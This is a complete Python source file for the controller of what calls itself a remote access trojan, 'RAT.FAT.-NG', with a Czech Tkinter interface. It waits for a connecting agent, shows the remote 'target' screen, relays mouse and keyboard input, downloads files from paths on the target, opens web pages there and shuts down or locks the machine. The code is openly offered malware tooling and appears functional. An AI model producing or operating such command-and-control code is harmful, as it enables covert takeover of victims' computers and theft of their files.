#!/usr/bin/env python3
# RAT.FAT.-NG - controller
import base64, io, json, socket, struct, threading, time
import tkinter as tk
from tkinter import filedialog, ttk
from PIL import Image, ImageTk

CANVAS_W, CANVAS_H = 960, 540

def send_msg(sock, obj):
    data = json.dumps(obj).encode()
    sock.sendall(struct.pack("!I", len(data)) + data)

def _recvall(sock, n):
    buf = b""
    while len(buf) < n:
        c = sock.recv(n - len(buf))
        if not c:
            return None
        buf += c
    return buf

def recv_msg(sock):
    h = _recvall(sock, 4)
    if not h:
        return None
    (n,) = struct.unpack("!I", h)
    d = _recvall(sock, n)
    if d is None:
        return None
    return json.loads(d.decode())


class Rat(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("RAT.FAT.-NG")
        self.geometry("400x700")
        self.sock = None
        self.srv = None
        self.remote_w, self.remote_h = 1920, 1080
        self.disp = (0, 0, 0, 0)
        self.photo = None
        self.draw_mode = False
        self.last = None
        self._send_lock = threading.Lock()

        self.build_ui()
        self.protocol("WM_DELETE_WINDOW", self.on_close)

    # ---------- UI ----------
    def build_ui(self):
        top = tk.Frame(self); top.pack(fill="x", padx=6, pady=6)
        tk.Label(top, text="Port:").pack(side="left")
        self.port = tk.Entry(top, width=7); self.port.insert(0, "5555"); self.port.pack(side="left")
        tk.Button(top, text="Spustit server", command=self.start_server,
                  bg="#1e7d32", fg="white").pack(side="left", padx=4)

        self.status = tk.Label(self, text="Server neběží", fg="#b00", anchor="w")
        self.status.pack(fill="x", padx=6)

        scr = tk.LabelFrame(self, text="Obrazovka"); scr.pack(fill="both", expand=True, padx=6, pady=6)
        self.screen_win = tk.Toplevel(self)
        self.screen_win.title("RAT.FAT.-NG — cizí obrazovka")
        self.canvas = tk.Canvas(self.screen_win, width=CANVAS_W, height=CANVAS_H,
                                bg="black", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        self.img_id = self.canvas.create_image(0, 0, anchor="nw")
        self.res_lbl = tk.Label(self.screen_win, text="nepřipojeno", anchor="w")
        self.res_lbl.pack(fill="x")
        tk.Label(scr, text="Ovládací okno — obrazovka je v druhém okně").pack()

        self.canvas.bind("<Motion>", self.on_move)
        self.canvas.bind("<ButtonPress-1>", lambda e: self.on_press(e, "left"))
        self.canvas.bind("<ButtonRelease-1>", lambda e: self.on_release(e, "left"))
        self.canvas.bind("<ButtonPress-3>", lambda e: self.on_press(e, "right"))
        self.canvas.bind("<ButtonRelease-3>", lambda e: self.on_release(e, "right"))
        self.canvas.bind("<MouseWheel>", self.on_wheel)
        self.canvas.bind("<Button-4>", lambda e: self.send({"cmd": "scroll", "amount": 3}))
        self.canvas.bind("<Button-5>", lambda e: self.send({"cmd": "scroll", "amount": -3}))
        self.canvas.bind("<Enter>", lambda e: self.canvas.focus_set())
        self.canvas.bind("<Key>", self.on_key)
        self.canvas.focus_set()

        box = tk.Frame(self); box.pack(fill="x", padx=6)
        self.draw_btn = tk.Button(box, text="✎ Malovat: VYP", command=self.toggle_draw)
        self.draw_btn.pack(side="left")
        tk.Button(box, text="Smazat kresbu", command=lambda: self.canvas.delete("draw")).pack(side="left", padx=4)
        tk.Button(box, text="Odpojit", command=self.disconnect).pack(side="right")

        q = tk.LabelFrame(self, text="Kvalita / FPS"); q.pack(fill="x", padx=6, pady=4)
        self.qs = tk.Scale(q, from_=20, to=90, orient="horizontal", label="kvalita",
                           command=lambda v: self.send({"cmd": "quality", "q": int(v)}))
        self.qs.set(55); self.qs.pack(fill="x")
        self.fs = tk.Scale(q, from_=1, to=30, orient="horizontal", label="fps",
                           command=lambda v: self.send({"cmd": "fps", "f": int(v)}))
        self.fs.set(12); self.fs.pack(fill="x")

        u = tk.LabelFrame(self, text="Otevřít stránku"); u.pack(fill="x", padx=6, pady=4)
        self.url = tk.Entry(u); self.url.insert(0, "https://"); self.url.pack(side="left", fill="x", expand=True)
        tk.Button(u, text="Otevřít", command=self.open_url).pack(side="left")

        f = tk.LabelFrame(self, text="Stáhnout soubor (cesta na cíli)"); f.pack(fill="x", padx=6, pady=4)
        self.fpath = tk.Entry(f); self.fpath.pack(side="left", fill="x", expand=True)
        tk.Button(f, text="Stáhnout", command=self.get_file).pack(side="left")

        p = tk.LabelFrame(self, text="Napájení"); p.pack(fill="x", padx=6, pady=4)
        self.power = ttk.Combobox(p, values=["shutdown", "restart", "logoff", "lock"], state="readonly")
        self.power.set("shutdown"); self.power.pack(side="left", fill="x", expand=True)
        tk.Button(p, text="Provést", command=self.do_power).pack(side="left")

        ch = tk.LabelFrame(self, text="Zprávy"); ch.pack(fill="both", expand=True, padx=6, pady=4)
        self.chat = tk.Text(ch, height=6, state="disabled")
        self.chat.pack(fill="both", expand=True)
        row = tk.Frame(ch); row.pack(fill="x")
        self.msg = tk.Entry(row); self.msg.pack(side="left", fill="x", expand=True)
        self.msg.bind("<Return>", lambda e: self.send_chat())
        tk.Button(row, text="Poslat", command=self.send_chat).pack(side="left")

    # ---------- server ----------
    def start_server(self):
        if self.srv: return
        try:
            port = int(self.port.get())
        except ValueError:
            return
        self.srv = socket.socket()
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(("0.0.0.0", port))
        self.srv.listen(5)
        self.set_status("Čekám na agenta na portu %d..." % port, "#a60")
        threading.Thread(target=self.accept_loop, daemon=True).start()

    def accept_loop(self):
        while self.srv:
            try:
                s, addr = self.srv.accept()
            except OSError:
                return
            if self.sock:
                try: s.close()
                except Exception: pass
                continue
            self.sock = s
            threading.Thread(target=self.recv_loop, daemon=True).start()

    def recv_loop(self):
        while True:
            try:
                m = recv_msg(self.sock)
            except Exception:
                m = None
            if m is None:
                self.after(0, self.disconnected)
                return
            t = m.get("type")
            if t == "frame":
                self.after(0, lambda mm=m: self.show_frame(mm))
            elif t == "info":
                self.after(0, lambda mm=m: self.set_status(
                    "Připojeno: %s / %s / %s" % (mm.get("host"), mm.get("os"), mm.get("user")), "#1e7d32"))
            elif t == "chat":
                self.after(0, lambda mm=m: self.add_chat("CÍL", mm.get("text", "")))
            elif t == "file":
                self.after(0, lambda mm=m: self.save_file(mm))

    def send(self, obj):
        if not self.sock: return
        try:
            with self._send_lock:
                send_msg(self.sock, obj)
        except Exception:
            self.disconnected()

    def disconnected(self):
        self.sock = None
        self.set_status("Odpojeno", "#b00")

    def disconnect(self):
        self.send({"cmd": "exit"})
        try:
            if self.sock: self.sock.close()
        except Exception: pass
        self.disconnected()

    # ---------- obraz ----------
    def show_frame(self, m):
        try:
            img = Image.open(io.BytesIO(base64.b64decode(m["data"])))
        except Exception:
            return
        self.remote_w, self.remote_h = m["w"], m["h"]
        cw = max(self.canvas.winfo_width(), CANVAS_W)
        ch = max(self.canvas.winfo_height(), CANVAS_H)
        sc = min(cw / self.remote_w, ch / self.remote_h)
        dw, dh = max(1, int(self.remote_w * sc)), max(1, int(self.remote_h * sc))
        ox, oy = (cw - dw) // 2, (ch - dh) // 2
        self.disp = (dw, dh, ox, oy)
        self.photo = ImageTk.PhotoImage(img.resize((dw, dh)))
        self.canvas.itemconfig(self.img_id, image=self.photo)
        self.canvas.coords(self.img_id, ox, oy)
        self.canvas.tag_lower(self.img_id)
        self.res_lbl.config(text="rozlišení cíle: %dx%d" % (self.remote_w, self.remote_h))

    def to_remote(self, cx, cy):
        dw, dh, ox, oy = self.disp
        if dw <= 0: return 0, 0
        rx = int((cx - ox) * self.remote_w / dw)
        ry = int((cy - oy) * self.remote_h / dh)
        return max(0, min(rx, self.remote_w - 1)), max(0, min(ry, self.remote_h - 1))

    # ---------- myš / klávesy ----------
    def on_move(self, e):
        if self.draw_mode:
            if self.last:
                self.canvas.create_line(self.last[0], self.last[1], e.x, e.y,
                                        fill="red", width=3, tags="draw")
            self.last = (e.x, e.y)
            return
        x, y = self.to_remote(e.x, e.y)
        self.send({"cmd": "move", "x": x, "y": y})

    def on_press(self, e, btn):
        self.canvas.focus_set()
        if self.draw_mode:
            self.last = (e.x, e.y)
            return
        x, y = self.to_remote(e.x, e.y)
        self.send({"cmd": "move", "x": x, "y": y})
        self.send({"cmd": "mdown", "button": btn})

    def on_release(self, e, btn):
        if self.draw_mode:
            self.last = None
            return
        self.send({"cmd": "mup", "button": btn})

    def on_wheel(self, e):
        self.send({"cmd": "scroll", "amount": 3 if e.delta > 0 else -3})

    def on_key(self, e):
        special = {"Return": "return", "BackSpace": "backspace", "Tab": "tab",
                   "Escape": "escape", "space": "space", "Delete": "delete",
                   "Up": "up", "Down": "down", "Left": "left", "Right": "right",
                   "Home": "home", "End": "end", "Prior": "prior", "Next": "next"}
        if e.keysym in special:
            self.send({"cmd": "key", "k": special[e.keysym]})
        elif e.char:
            self.send({"cmd": "type", "text": e.char})

    # ---------- akce ----------
    def toggle_draw(self):
        self.draw_mode = not self.draw_mode
        self.draw_btn.config(text="✎ Malovat: %s" % ("ZAP" if self.draw_mode else "VYP"),
                             bg="#c62828" if self.draw_mode else "SystemButtonFace",
                             fg="white" if self.draw_mode else "black")

    def open_url(self):
        u = self.url.get().strip()
        if u: self.send({"cmd": "url", "url": u})

    def get_file(self):
        p = self.fpath.get().strip()
        if p: self.send({"cmd": "file", "path": p})

    def save_file(self, m):
        dest = filedialog.asksaveasfilename(initialfile=m.get("name", "soubor"))
        if not dest: return
        with open(dest, "wb") as f:
            f.write(base64.b64decode(m["data"]))
        self.add_chat("SYS", "uloženo: " + dest)

    def do_power(self):
        self.send({"cmd": "power", "action": self.power.get()})

    def send_chat(self):
        t = self.msg.get().strip()
        if not t: return
        self.send({"cmd": "chat", "text": t})
        self.add_chat("JÁ", t)
        self.msg.delete(0, "end")

    def add_chat(self, who, text):
        self.chat.config(state="normal")
        self.chat.insert("end", "[%s] %s\n" % (who, text))
        self.chat.see("end")
        self.chat.config(state="disabled")

    def set_status(self, txt, color="#000"):
        self.status.config(text=txt, fg=color)

    def on_close(self):
        try:
            if self.sock: self.sock.close()
            if self.srv: self.srv.close()
        except Exception: pass
        self.destroy()


if __name__ == "__main__":
    Rat().mainloop()